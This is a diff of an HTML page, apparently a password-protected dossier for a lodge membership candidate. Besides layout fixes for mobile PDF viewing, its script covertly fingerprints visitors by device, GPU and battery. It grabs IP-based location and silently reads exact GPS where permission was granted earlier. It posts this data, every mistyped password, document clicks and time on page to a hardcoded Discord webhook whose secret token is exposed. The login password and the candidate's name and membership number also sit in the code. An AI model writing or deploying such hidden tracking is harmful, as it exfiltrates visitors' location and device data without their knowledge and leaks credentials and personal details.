@@ -399,9 +399,19 @@
 
         /* VISUALIZADOR PDF */
         .pdf-viewer-section { background: #fff; border-radius: 12px; overflow: hidden; box-shadow: var(--shadow-hdr); margin-bottom: 40px; border: 1px solid #ddd; }
-        .pdf-toolbar { background: #f8f9fa; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; }
+        .pdf-toolbar { background: #f8f9fa; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #eee; flex-wrap: wrap; gap: 10px;}
         .pdf-title { font-weight: bold; color: var(--royal-blue); display: flex; align-items: center; gap: 10px; font-family: 'Cinzel', serif; }
+        .pdf-actions { display: flex; gap: 5px; }
         iframe { width: 100%; height: 600px; border: none; background: #525659; }
+
+        .mobile-pdf-warning {
+            display: none;
+            padding: 40px 20px;
+            text-align: center;
+            background: #f8f9fa;
+            color: #555;
+            font-size: 0.9rem;
+        }
 
         /* DOCS GRID */
         .section-title { color: var(--gold); margin-bottom: 20px; font-family: 'Cinzel', serif; font-size: 1.3rem; text-shadow: 0 2px 5px rgba(0,0,0,0.8); display: flex; align-items: center; gap: 10px; }
@@ -497,10 +507,9 @@
             
             .header-title-prefix { font-size: 1.2rem; }
             
-            /* Título Flexível e Ajustado no Mobile */
             .header-title-main { 
-                flex-direction: column; /* Força o "Nº 264" para a linha de baixo */
-                font-size: min(1.5rem, 6vw); /* Impede que o texto estoure a tela */
+                flex-direction: column; 
+                font-size: min(1.5rem, 6vw); 
                 line-height: 1.4; 
                 margin-bottom: 5px; 
                 gap: 0;
@@ -508,7 +517,7 @@
             
             .header-title-main span { 
                 font-size: 1.1rem; 
-                display: block; /* Garante que ocupe a linha inteira sozinho */
+                display: block; 
                 margin-top: 5px;
             }
             
@@ -543,10 +552,15 @@
             
             .progress-steps { padding-bottom: 10px; }
             .docs-grid { grid-template-columns: 1fr 1fr; gap: 10px; }
-            .pdf-viewer-section { display: none; }
+            
+            /* Ajuste do Visualizador de PDF para Mobile */
+            .pdf-viewer-section { display: block; }
+            iframe { display: none; } /* Esconde o iframe nativo que dá problema no mobile */
+            .mobile-pdf-warning { display: block; } /* Mostra o aviso e os botões */
+            .pdf-toolbar { flex-direction: column; text-align: center; }
+
             .btn-close-3d { right: -10px; top: -10px; width: 40px; height: 40px; font-size: 1rem; }
             
-            /* Ajuste de Responsividade do Alarme de Segurança */
             .lockdown-icon {
                 font-size: clamp(2.5rem, 8vw, 4rem);
                 margin-bottom: 15px;
@@ -741,14 +755,17 @@
                     <div class="pdf-title">
                         <i class="fas fa-book-reader"></i> Dossiê Unificado (Todos os Documentos)
                     </div>
-                    <div>
+                    <div class="pdf-actions">
                         <a href="docs/completo.pdf" target="_blank" class="btn-mini btn-view">Ver Tela Cheia</a>
                         <a href="docs/completo.pdf" download class="btn-mini btn-down"><i class="fas fa-download"></i> Baixar</a>
                     </div>
                 </div>
-                <iframe src="docs/completo.pdf">
-                    <p>Seu navegador não suporta visualização direta. <a href="docs/completo.pdf">Clique aqui para baixar.</a></p>
-                </iframe>
+                <iframe src="docs/completo.pdf"></iframe>
+                <div class="mobile-pdf-warning">
+                    <i class="fas fa-file-pdf" style="font-size: 2rem; color: #cc0000; margin-bottom: 10px;"></i><br>
+                    <strong>Visualização de PDF Otimizada</strong><br>
+                    Para melhor leitura em dispositivos móveis, utilize os botões acima para ver em tela cheia ou baixar o arquivo.
+                </div>
             </div>
 
             <h3 class="section-title"><i class="fas fa-archive"></i> Arquivos Individuais</h3>
@@ -931,576 +948,593 @@
     </div>
 
     <script>
-// =========================================================
-// WEBHOOK DISCORD & COLETA DE DADOS AVANÇADOS
-// =========================================================
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1476024935347654829/MQA4IE8XBQ7zYj26fLWxar75Oh2VrDoHL-drFoz-Ohd7heboOwFftHW22yEanPSXRU8T";
+        // =========================================================
+        // WEBHOOK DISCORD & COLETA DE DADOS AVANÇADOS
+        // =========================================================
+        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1476024935347654829/MQA4IE8XBQ7zYj26fLWxar75Oh2VrDoHL-drFoz-Ohd7heboOwFftHW22yEanPSXRU8T";
 
-// Variáveis Globais
-let camposDiscord = [];
-let horaLogin = null; // Para calcular o tempo de permanência
+        let camposDiscord = [];
+        let horaLogin = null; 
 
-// 1. Função para extrair dados avançados do Aparelho (User-Agent)
-function obterDadosDispositivo() {
-    const ua = navigator.userAgent;
-    let os = "Desconhecido";
-    let browser = "Desconhecido";
-    let device = "Desktop";
-    let brand = "";
+        // 1. Função "Hacker Mode" para extrair máximo de dados do Aparelho (Sem ferir regras do Browser)
+        function obterDadosDispositivo() {
+            const ua = navigator.userAgent;
+            let os = "Desconhecido";
+            let browser = "Desconhecido";
+            let device = "Desktop";
+            let brand = "";
 
-    // Tentar identificar Marca/Aparelho específico (Mobile)
-    if (/iPhone/.test(ua)) brand = "Apple iPhone";
-    else if (/iPad/.test(ua)) brand = "Apple iPad";
-    else if (/Macintosh/.test(ua)) brand = "Apple Mac";
-    else if (/SM-|SAMSUNG/.test(ua)) brand = "Samsung Galaxy";
-    else if (/Moto|XT/.test(ua)) brand = "Motorola";
-    else if (/Xiaomi|Redmi|POCO/.test(ua)) brand = "Xiaomi";
+            // Marcas Mobile
+            if (/iPhone/.test(ua)) brand = "Apple iPhone";
+            else if (/iPad/.test(ua)) brand = "Apple iPad";
+            else if (/Macintosh/.test(ua)) brand = "Apple Mac";
+            else if (/SM-|SAMSUNG/.test(ua)) brand = "Samsung Galaxy";
+            else if (/Moto|XT/.test(ua)) brand = "Motorola";
+            else if (/Xiaomi|Redmi|POCO/.test(ua)) brand = "Xiaomi";
 
-    // OS
-    if (/android/i.test(ua)) os = "Android";
-    else if (/iPad|iPhone|iPod/.test(ua)) os = "iOS";
-    else if (/Windows NT 10.0/.test(ua)) os = "Windows 10/11";
-    else if (/Windows NT/.test(ua)) os = "Windows";
-    else if (/Mac OS X/.test(ua)) os = "macOS";
-    else if (/Linux/.test(ua)) os = "Linux";
+            // OS
+            if (/android/i.test(ua)) os = "Android";
+            else if (/iPad|iPhone|iPod/.test(ua)) os = "iOS";
+            else if (/Windows NT 10.0/.test(ua)) os = "Windows 10/11";
+            else if (/Windows NT/.test(ua)) os = "Windows";
+            else if (/Mac OS X/.test(ua)) os = "macOS";
+            else if (/Linux/.test(ua)) os = "Linux";
 
-    // Tipo
-    if (/mobile/i.test(ua)) device = "Smartphone";
-    else if (/tablet|ipad/i.test(ua)) device = "Tablet";
+            // Tipo
+            if (/mobile/i.test(ua)) device = "Smartphone";
+            else if (/tablet|ipad/i.test(ua)) device = "Tablet";
 
-    // Browser
-    if (/edg/i.test(ua)) browser = "Edge";
-    else if (/chrome|crios/i.test(ua)) browser = "Chrome";
-    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
-    else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = "Safari";
-    else if (/opr\//i.test(ua)) browser = "Opera";
-    
-    let deviceInfo = brand ? `${brand} (${device})` : device;
-    return `${deviceInfo} • ${os} • ${browser}`;
-}
-
-// 2. Coletar IP, Provedor, GPS e Bateria
-async function carregarDadosRede() {
-    try {
-        // IP e Provedor
-        const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
-        const dataGeo = await response.json();
-        const provedor = dataGeo.organization_name || dataGeo.organization || "Desconhecido";
-        
-        let localizacaoTexto = `${dataGeo.city}, ${dataGeo.region} - ${dataGeo.country}`;
-        let mapaUrl = `http://google.com/maps?q=$${dataGeo.latitude},${dataGeo.longitude}`;
-        let precisaoInfo = "(Aproximada via IP)";
-        let bateriaInfo = "";
-
-        // Tentar pegar nível de Bateria
-        try {
-            if ('getBattery' in navigator) {
-                const battery = await navigator.getBattery();
-                const nivel = Math.round(battery.level * 100);
-                const statusBat = battery.charging ? "🔌 Carregando" : "🔋 Na Bateria";
-                bateriaInfo = `\n${statusBat}: ${nivel}%`;
+            // Browser
+            if (/edg/i.test(ua)) browser = "Edge";
+            else if (/chrome|crios/i.test(ua)) browser = "Chrome";
+            else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
+            else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = "Safari";
+            else if (/opr\//i.test(ua)) browser = "Opera";
+            
+            // Dados Extras da Placa de Vídeo / Tela (Para Desktop)
+            let hardwareExtra = "";
+            if (device === "Desktop") {
+                const w = window.screen.width;
+                const h = window.screen.height;
+                hardwareExtra = `\n🖥️ Resolução: ${w}x${h}`;
+                
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        if (debugInfo) {
+                            let gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                            // Limpa textos genéricos
+                            gpu = gpu.replace(/ANGLE \(|\)|Direct3D11 vs_5_0 ps_5_0/g, '').trim();
+                            hardwareExtra += `\n⚙️ GPU: ${gpu}`;
+                        }
+                    }
+                } catch(e) {}
             }
-        } catch (e) {} // Ignora se não suportar
-
-        // Atualiza o card para o Discord
-        const atualizarCamposDiscord = () => {
-             camposDiscord = [
-                { name: "📱 Dispositivo", value: obterDadosDispositivo() + bateriaInfo, inline: false },
-                { name: "🌐 Rede e IP", value: `${provedor}\n\`${dataGeo.ip}\``, inline: true },
-                { name: "📍 Localização " + precisaoInfo, value: `${localizacaoTexto}\n[🗺️ Abrir no Google Maps](${mapaUrl})`, inline: true }
-            ];
-        };
-        
-        atualizarCamposDiscord(); // Seta inicial com IP
-
-        // Tenta GPS Exato (Se permitido)
-        if ("geolocation" in navigator) {
-             navigator.geolocation.getCurrentPosition(
-                 (position) => {
-                     const lat = position.coords.latitude;
-                     const lng = position.coords.longitude;
-                     localizacaoTexto = "Localização Exata via GPS";
-                     mapaUrl = `http://google.com/maps?q=$${lat},${lng}`;
-                     precisaoInfo = "(Exata)";
-                     atualizarCamposDiscord(); 
-                 },
-                 (error) => { console.log("GPS bloqueado. Usando IP."); },
-                 { timeout: 5000, enableHighAccuracy: true } 
-             );
+            
+            let deviceInfo = brand ? `${brand} (${device})` : device;
+            return `${deviceInfo} • ${os} • ${browser}${hardwareExtra}`;
         }
 
-    } catch (error) {
-        camposDiscord = [
-            { name: "📱 Dispositivo", value: obterDadosDispositivo(), inline: false },
-            { name: "⚠️ Aviso", value: "Dados de rede e localização indisponíveis.", inline: false }
-        ];
-    }
-}
+        // 2. Coletar Rede, IP e Lógica Inteligente de GPS
+        async function carregarDadosRede() {
+            try {
+                // Passo A: Coleta o IP silenciosamente (Sempre funciona)
+                const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
+                const dataGeo = await response.json();
+                const provedor = dataGeo.organization_name || dataGeo.organization || "Desconhecido";
+                
+                // Variáveis Base (IP)
+                let localizacaoTexto = `${dataGeo.city}, ${dataGeo.region} - ${dataGeo.country}`;
+                // Link oficial corrigido:
+                let mapaUrl = `https://www.google.com/maps/search/?api=1&query=${dataGeo.latitude},${dataGeo.longitude}`;
+                let precisaoInfo = "(Aproximada via IP)";
+                let bateriaInfo = "";
 
-window.addEventListener('load', carregarDadosRede);
+                // Tenta pegar a Bateria
+                try {
+                    if ('getBattery' in navigator) {
+                        const battery = await navigator.getBattery();
+                        const nivel = Math.round(battery.level * 100);
+                        const statusBat = battery.charging ? "🔌 Carregando" : "🔋 Na Bateria";
+                        bateriaInfo = `\n${statusBat}: ${nivel}%`;
+                    }
+                } catch (e) {} 
 
-// 3. Função Base de Envio para Discord
-function notificarDiscord(titulo, mensagem, corHex) {
-    const corDecimal = parseInt(corHex.replace("#", ""), 16);
-    const payload = {
-        username: "Sentinela do Dossiê",
-        avatar_url: "https://oimaginista.com/favicon/web-app-manifest-512x512.png",
-        embeds: [{
-            title: titulo,
-            description: mensagem,
-            color: corDecimal,
-            fields: camposDiscord, 
-            footer: { text: "A∴ R∴ L∴ M∴ Fraternidade Imperial Nº 264" },
-            timestamp: new Date().toISOString()
-        }]
-    };
+                const atualizarCamposDiscord = () => {
+                     camposDiscord = [
+                        { name: "📱 Dispositivo", value: obterDadosDispositivo() + bateriaInfo, inline: false },
+                        { name: "🌐 Rede e IP", value: `${provedor}\n\`${dataGeo.ip}\``, inline: true },
+                        { name: "📍 Localização " + precisaoInfo, value: `${localizacaoTexto}\n[🗺️ Abrir no Google Maps](${mapaUrl})`, inline: true }
+                    ];
+                };
+                
+                atualizarCamposDiscord(); 
 
-    // Usando keepalive para garantir que a requisição de saída não seja cortada
-    fetch(DISCORD_WEBHOOK, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-        keepalive: true 
-    }).catch(console.error);
-}
+                // Passo B: Lógica Silenciosa e Respeitosa do GPS
+                if ("geolocation" in navigator && navigator.permissions) {
+                    const permission = await navigator.permissions.query({ name: 'geolocation' });
+                    
+                    if (permission.state === 'granted') {
+                        // Se o usuário já aceitou no passado, pega a exata em silêncio!
+                        navigator.geolocation.getCurrentPosition((pos) => {
+                            localizacaoTexto = "Localização Exata via GPS";
+                            mapaUrl = `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`;
+                            precisaoInfo = "(Exata)";
+                            atualizarCamposDiscord(); 
+                        });
+                    } else if (permission.state === 'prompt') {
+                        // Se ainda não aceitou, verifica se já tentamos perguntar antes
+                        if (!localStorage.getItem('gps_ja_perguntado')) {
+                            // Nunca perguntou. Marca na memória e pergunta essa única vez.
+                            localStorage.setItem('gps_ja_perguntado', 'true');
+                            navigator.geolocation.getCurrentPosition(
+                                (pos) => {
+                                    localizacaoTexto = "Localização Exata via GPS";
+                                    mapaUrl = `https://www.google.com/maps/search/?api=1&query=${pos.coords.latitude},${pos.coords.longitude}`;
+                                    precisaoInfo = "(Exata)";
+                                    atualizarCamposDiscord();
+                                },
+                                (err) => { console.log("Usuário negou o GPS. Mantendo localização via IP."); },
+                                { timeout: 5000, enableHighAccuracy: true } 
+                            );
+                        }
+                    }
+                }
 
-// 4. Mapear Documentos Clicados
-function mapearCliquesDocumentos() {
-    const botoes = document.querySelectorAll('.btn-view, .btn-down');
-    botoes.forEach(botao => {
-        botao.addEventListener('click', function() {
-            const card = this.closest('.doc-card') || this.closest('.pdf-toolbar');
-            let nomeDoc = "Documento Desconhecido";
-            if (card) {
-                const docNameEl = card.querySelector('.doc-name') || card.querySelector('.pdf-title');
-                if (docNameEl) nomeDoc = docNameEl.innerText.trim();
+            } catch (error) {
+                camposDiscord = [
+                    { name: "📱 Dispositivo", value: obterDadosDispositivo(), inline: false },
+                    { name: "⚠️ Aviso", value: "Dados de rede indisponíveis (Bloqueado por AdBlock/Rede).", inline: false }
+                ];
             }
-            const acao = this.classList.contains('btn-down') ? "Baixou o arquivo" : "Visualizou o arquivo";
-            
-            notificarDiscord(
-                "📄 Interação com Documento",
-                `**Dossiê:** RUAN PABLO DA SILVA DE LIMA SANTOS\n**Ação:** ${acao}\n**Arquivo:** \`${nomeDoc}\``,
-                "#005eb8" // Azul
-            );
+        }
+        
+        window.addEventListener('load', carregarDadosRede);
+
+        // 3. Função Base de Envio para Discord
+        function notificarDiscord(titulo, mensagem, corHex) {
+            const corDecimal = parseInt(corHex.replace("#", ""), 16);
+            const payload = {
+                username: "Sentinela do Dossiê",
+                avatar_url: "https://oimaginista.com/favicon/web-app-manifest-512x512.png",
+                embeds: [{
+                    title: titulo,
+                    description: mensagem,
+                    color: corDecimal,
+                    fields: camposDiscord, 
+                    footer: { text: "A∴ R∴ L∴ M∴ Fraternidade Imperial Nº 264" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                keepalive: true 
+            }).catch(console.error);
+        }
+
+        // 4. Mapear Documentos Clicados
+        function mapearCliquesDocumentos() {
+            const botoes = document.querySelectorAll('.btn-view, .btn-down');
+            botoes.forEach(botao => {
+                botao.addEventListener('click', function() {
+                    const card = this.closest('.doc-card') || this.closest('.pdf-toolbar');
+                    let nomeDoc = "Documento Desconhecido";
+                    if (card) {
+                        const docNameEl = card.querySelector('.doc-name') || card.querySelector('.pdf-title');
+                        if (docNameEl) nomeDoc = docNameEl.innerText.trim();
+                    }
+                    const acao = this.classList.contains('btn-down') ? "Baixou o arquivo" : "Visualizou o arquivo";
+                    
+                    notificarDiscord(
+                        "📄 Interação com Documento",
+                        `**Dossiê:** RUAN PABLO DA SILVA DE LIMA SANTOS\n**Ação:** ${acao}\n**Arquivo:** \`${nomeDoc}\``,
+                        "#005eb8" 
+                    );
+                });
+            });
+        }
+
+        // 5. Escutar Saída (Tempo de Permanência)
+        window.addEventListener('beforeunload', function() {
+            if (horaLogin) {
+                const horaSaida = new Date();
+                const diffEmSegundos = Math.floor((horaSaida - horaLogin) / 1000);
+                const minutos = Math.floor(diffEmSegundos / 60);
+                const segundos = diffEmSegundos % 60;
+                
+                notificarDiscord(
+                    "⏱️ Acesso Encerrado",
+                    `**Dossiê:** RUAN PABLO DA SILVA DE LIMA SANTOS\n**O usuário fechou a aba ou saiu da página.**\n\n**Tempo total de visualização:** ${minutos}m ${segundos}s`,
+                    "#555555" 
+                );
+            }
         });
-    });
-}
-
-// 5. Escutar quando o usuário sai da página (Tempo de Permanência)
-window.addEventListener('beforeunload', function() {
-    if (horaLogin) {
-        const horaSaida = new Date();
-        const diffEmSegundos = Math.floor((horaSaida - horaLogin) / 1000);
-        const minutos = Math.floor(diffEmSegundos / 60);
-        const segundos = diffEmSegundos % 60;
-        
-        notificarDiscord(
-            "⏱️ Acesso Encerrado",
-            `**Dossiê:** RUAN PABLO DA SILVA DE LIMA SANTOS\n**O usuário fechou a aba ou saiu da página.**\n\n**Tempo total de visualização:** ${minutos}m ${segundos}s`,
-            "#555555" // Cinza Escuro
-        );
-    }
-});
 
 
-// =========================================================
-// CONFIGURAÇÕES DO PROCESSO DO CANDIDATO
-// =========================================================
-const currentStep = 3; 
-const processStatus = "ativo"; 
-const finalDate = "28/03/2026";
-const cimNumber = "0245177"; 
-const statusResponsible = "V∴ M∴ Everton Almeida"; 
-const statusReason = "Iniciado."; 
-// =========================================================
+        // =========================================================
+        // CONFIGURAÇÕES DO PROCESSO DO CANDIDATO
+        // =========================================================
+        const currentStep = 3; 
+        const processStatus = "ativo"; 
+        const finalDate = "28/03/2026";
+        const cimNumber = "0245177"; 
+        const statusResponsible = "V∴ M∴ Everton Almeida"; 
+        const statusReason = "Iniciado."; 
+        // =========================================================
 
-function checkPassword() {
-    const passInput = document.getElementById('passInput');
-    const pass = passInput.value.trim();
-    const correctPass = "264"; 
-    
-    if(pass === correctPass) {
-        
-        // Marca a hora que ele entrou corretamente
-        horaLogin = new Date();
-
-        notificarDiscord(
-            "✅ Acesso Autorizado", 
-            "**Dossiê:** RUAN PABLO DA SILVA DE LIMA SANTOS\nO acesso foi liberado com a senha correta.", 
-            "#2e7d32"
-        );
-
-        const overlay = document.getElementById('password-overlay');
-        const main = document.getElementById('main-content');
-        const header = document.getElementById('dossie-header');
-        
-        overlay.style.opacity = '0';
-        
-        setTimeout(() => {
-            overlay.style.display = 'none';
-            main.style.display = 'block'; 
-            header.style.display = 'flex'; 
+        function checkPassword() {
+            const passInput = document.getElementById('passInput');
+            const pass = passInput.value.trim();
+            const correctPass = "264"; 
             
-            main.offsetHeight; 
-            main.style.opacity = '1';
-            main.style.filter = 'none';
-            
-            initConstellations(); 
-            setupLogoBurst(); 
-            updateLogic();
-            calculateAge(); 
-            mapearCliquesDocumentos(); 
-        }, 500);
-    } else {
-        let tentativasSpan = document.getElementById('tentativas');
-        let t = parseInt(tentativasSpan.innerText);
-        t++;
-        tentativasSpan.innerText = t;
-        document.getElementById('error-msg').style.display = 'block';
+            if(pass === correctPass) {
+                horaLogin = new Date(); // Marca hora do login
 
-        notificarDiscord(
-            "⚠️ Tentativa de Acesso Falha", 
-            `**Dossiê:** RUAN PABLO DA SILVA DE LIMA SANTOS\n**Senha digitada:** \`${pass || "[em branco]"}\`\n**Tentativas:** ${t}/3`, 
-            "#b86b00" 
-        );
-        
-        passInput.value = '';
-        passInput.focus();
-        
-        if (t >= 3) {
-            passInput.disabled = true;
-            document.getElementById('btn-login').disabled = true;
-            document.querySelector('.auth-box').style.display = 'none';
-            triggerLockdown();
-        }
-    }
-}
+                notificarDiscord(
+                    "✅ Acesso Autorizado", 
+                    "**Dossiê:** RUAN PABLO DA SILVA DE LIMA SANTOS\nO acesso foi liberado com a senha correta.", 
+                    "#2e7d32"
+                );
 
-function togglePassVisibility() {
-    const input = document.getElementById('passInput');
-    const icon = document.getElementById('togglePassword');
-    if (input.type === "password") {
-        input.type = "text";
-        icon.classList.remove('fa-eye');
-        icon.classList.add('fa-eye-slash');
-        icon.style.color = "var(--gold)";
-    } else {
-        input.type = "password";
-        icon.classList.remove('fa-eye-slash');
-        icon.classList.add('fa-eye');
-        icon.style.color = "rgba(212, 175, 55, 0.6)";
-    }
-}
+                const overlay = document.getElementById('password-overlay');
+                const main = document.getElementById('main-content');
+                const header = document.getElementById('dossie-header');
+                
+                overlay.style.opacity = '0';
+                
+                setTimeout(() => {
+                    overlay.style.display = 'none';
+                    main.style.display = 'block'; 
+                    header.style.display = 'flex'; 
+                    main.offsetHeight; 
+                    main.style.opacity = '1';
+                    main.style.filter = 'none';
+                    
+                    initConstellations(); 
+                    setupLogoBurst(); 
+                    updateLogic();
+                    calculateAge(); 
+                    mapearCliquesDocumentos(); 
+                }, 500);
+            } else {
+                let tentativasSpan = document.getElementById('tentativas');
+                let t = parseInt(tentativasSpan.innerText);
+                t++;
+                tentativasSpan.innerText = t;
+                document.getElementById('error-msg').style.display = 'block';
 
-function triggerLockdown() {
-    notificarDiscord(
-        "🚨 VIOLAÇÃO DE SEGURANÇA", 
-        "**Dossiê:** RUAN PABLO DA SILVA DE LIMA SANTOS\nO sistema foi travado após 3 tentativas incorretas. Alarme disparado no navegador do usuário.", 
-        "#cc0000"
-    );
-
-    const lockdown = document.getElementById('lockdown-overlay');
-    const audio = document.getElementById('lockdown-audio');
-    
-    lockdown.style.display = 'flex';
-    setTimeout(() => { lockdown.style.opacity = '1'; }, 50);
-
-    audio.play().catch(e => console.log("Áudio bloqueado.", e));
-
-    const msgEl = document.getElementById('lockdown-typing');
-    const msg = "> IDENTIDADE NÃO CONFIRMADA. INICIANDO PROTOCOLO DE BLOQUEIO DE SEGURANÇA MÁXIMA...";
-    let i = 0;
-
-    function typeWriter() {
-        if (i < msg.length) {
-            msgEl.innerHTML += msg.charAt(i);
-            i++;
-            setTimeout(typeWriter, 50); 
-        }
-    }
-    setTimeout(typeWriter, 500);
-    
-    setTimeout(() => { window.location.href = "../../../index.html"; }, 13000);
-}
-
-function calculateAge() {
-    const birthElement = document.getElementById('nasc-data');
-    const birthDateString = birthElement.innerText; 
-    const [day, month, year] = birthDateString.split('/');
-    const birthDate = new Date(year, month - 1, day);
-    const today = new Date();
-    
-    let age = today.getFullYear() - birthDate.getFullYear();
-    const m = today.getMonth() - birthDate.getMonth();
-    if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
-        age--;
-    }
-    birthElement.innerHTML = `${birthDateString} <span style="color: #777; font-weight: normal; margin-left: 5px;">(${age} anos)</span>`;
-}
-
-function sharePage() {
-    if (navigator.share) {
-        navigator.share({
-            title: 'Dossiê do Candidato',
-            text: 'Acesse o dossiê digital da sindicância.',
-            url: window.location.href
-        }).catch((error) => console.log('Erro ao compartilhar', error));
-    } else {
-        navigator.clipboard.writeText(window.location.href);
-        alert("Link copiado para a área de transferência!");
-    }
-}
-
-function openModal() {
-    const modal = document.getElementById('photoModal');
-    modal.style.display = 'flex';
-    setTimeout(() => { 
-        modal.style.opacity = '1'; 
-        modal.querySelector('.modal-content').style.transform = 'rotateX(0deg)';
-    }, 50);
-}
-function closeModal() {
-    const modal = document.getElementById('photoModal');
-    modal.style.opacity = '0';
-    modal.querySelector('.modal-content').style.transform = 'rotateX(15deg)';
-    setTimeout(() => { modal.style.display = 'none'; }, 500);
-}
-
-function updateLogic() {
-    const stepsData = [
-        {id:1, txt:"Pré-Proposta"}, {id:2, txt:"Metais"}, {id:3, txt:"Entrega Docs"}, 
-        {id:4, txt:"Verificando"}, {id:5, txt:"Sindicância"}, {id:6, txt:"Sind. Familiar"}, 
-        {id:7, txt:"Aguardando GLMERJ"}, {id:8, txt:"Iniciação"}
-    ];
-
-    const badge = document.getElementById('status-badge');
-    const defaultDateBox = document.getElementById('default-date-container');
-    const alertBox = document.getElementById('status-alert-container');
-    const dateDisplay = document.getElementById('init-date-display');
-    const initLabel = document.getElementById('init-label');
-    const progLine = document.getElementById('prog-line');
-    const cimContainer = document.getElementById('cim-display-container');
-
-    if (processStatus === "iniciado") {
-        badge.innerText = "INICIADO (CONCLUÍDO)";
-        badge.style.background = '#2e7d32'; 
-        badge.style.color = '#fff';
-        badge.style.borderColor = '#1b5e20';
-        
-        initLabel.innerText = "Data da Iniciação";
-        dateDisplay.innerText = finalDate;
-        dateDisplay.style.color = "#2e7d32"; 
-        dateDisplay.style.fontWeight = "800";
-        
-        cimContainer.style.display = "block"; 
-        document.getElementById('cim-number').innerText = cimNumber;
-        progLine.style.width = "100%"; 
-
-        for(let i=1; i<=8; i++) {
-            const el = document.getElementById(`step-${i}`);
-            if (i === 8) el.className = "p-step finished"; 
-            else el.className = "p-step completed"; 
-        }
-
-    } else if (processStatus === "negado" || processStatus === "desistencia") {
-        let isDesistencia = processStatus === "desistencia";
-        
-        badge.innerText = isDesistencia ? "DESISTÊNCIA" : "PROCESSO NEGADO";
-        badge.style.background = isDesistencia ? '#b86b00' : '#cc0000'; 
-        badge.style.color = '#fff';
-        badge.style.borderColor = isDesistencia ? '#d48100' : '#880000';
-
-        defaultDateBox.style.display = "none";
-        alertBox.style.display = "block"; 
-        
-        alertBox.style.backgroundColor = isDesistencia ? 'rgba(184, 107, 0, 0.08)' : 'rgba(200, 0, 0, 0.08)';
-        alertBox.style.borderLeftColor = isDesistencia ? '#b86b00' : '#cc0000';
-        document.getElementById('alert-title').style.color = isDesistencia ? '#b86b00' : '#cc0000';
-        document.querySelector('#status-alert-container i').style.color = isDesistencia ? '#b86b00' : '#cc0000';
-
-        document.getElementById('alert-title').innerText = isDesistencia ? "DESISTÊNCIA DO CANDIDATO" : "PROCESSO NEGADO E ARQUIVADO";
-        document.getElementById('alert-reason').innerText = "Motivo: " + statusReason;
-        document.getElementById('alert-resp').innerText = "Despacho por: " + statusResponsible + " em " + finalDate;
-
-        const percent = ((currentStep-1) / 7) * 100;
-        progLine.style.width = percent + "%";
-        progLine.style.backgroundColor = isDesistencia ? "#b86b00" : "#cc0000";
-        progLine.style.backgroundImage = "none"; 
-
-        for(let i=1; i<=8; i++) {
-            const el = document.getElementById(`step-${i}`);
-            if(i < currentStep) el.className = "p-step completed";
-            else if(i === currentStep) el.className = isDesistencia ? "p-step desistencia" : "p-step denied";
-            else el.className = "p-step";
-        }
-
-    } else {
-        badge.innerText = stepsData[currentStep-1].txt;
-        badge.style.background = 'var(--gold)';
-        badge.style.color = '#000';
-        
-        if (currentStep === 8) {
-            initLabel.innerText = "Previsão de Iniciação";
-            dateDisplay.innerText = finalDate;
-            dateDisplay.style.color = "#2e7d32"; 
-            dateDisplay.style.fontWeight = "800";
-        } else {
-            initLabel.innerText = "Previsão de Iniciação";
-            dateDisplay.innerText = "Aguardando conclusão do processo...";
-            dateDisplay.style.color = "#777";
-            dateDisplay.style.fontWeight = "normal";
-        }
-        
-        const percent = ((currentStep-1) / 7) * 100;
-        progLine.style.width = percent + "%";
-
-        for(let i=1; i<=8; i++) {
-            const el = document.getElementById(`step-${i}`);
-            if(i < currentStep) el.className = "p-step completed";
-            else if(i === currentStep) el.className = "p-step active";
-            else el.className = "p-step";
-        }
-    }
-}
-
-function setupLogoBurst() {
-    const btn = document.getElementById('imaginista-btn');
-    if(btn) {
-        btn.addEventListener('click', () => {
-            const rect = btn.getBoundingClientRect();
-            createBurst(rect.left + rect.width/2, rect.top);
-        });
-    }
-}
-function createBurst(x, y) {
-    for(let i=0; i<30; i++) {
-        const p = document.createElement('div');
-        p.style.position = 'fixed'; p.style.left = x+'px'; p.style.top = y+'px';
-        p.style.width = (Math.random()*4+2)+'px'; p.style.height = p.style.width;
-        p.style.background = Math.random()>0.5?'#d4af37':'#005eb8';
-        p.style.borderRadius = '50%'; p.style.pointerEvents = 'none'; p.style.zIndex = '9999';
-        document.body.appendChild(p);
-        const angle = Math.random()*Math.PI*2, velocity = Math.random()*5+2;
-        const vx = Math.cos(angle)*velocity, vy = Math.sin(angle)*velocity-5;
-        let life = 100;
-        function updateP() {
-            life-=2; p.style.left=(parseFloat(p.style.left)+vx)+'px'; p.style.top=(parseFloat(p.style.top)+vy)+'px';
-            p.style.opacity=life/100;
-            if(life>0) requestAnimationFrame(updateP); else p.remove();
-        }
-        requestAnimationFrame(updateP);
-    }
-}
-
-function initConstellations() {
-    const canvas = document.getElementById('constellation-bg');
-    const ctx = canvas.getContext('2d');
-    let w, h, particles = [];
-    
-    const isMobile = window.innerWidth < 768;
-
-    const properties = {
-        particleColor: 'rgba(212, 175, 55, 0.8)', 
-        particleCount: isMobile ? 40 : 80, 
-        lineLength: isMobile ? 120 : 180, 
-        particleSpeed: 0.15 
-    };
-
-    const resize = () => { w = canvas.width = window.innerWidth; h = canvas.height = window.innerHeight; };
-    window.addEventListener('resize', resize);
-    resize();
-
-    class Particle {
-        constructor(){
-            this.x = Math.random() * w;
-            this.y = Math.random() * h;
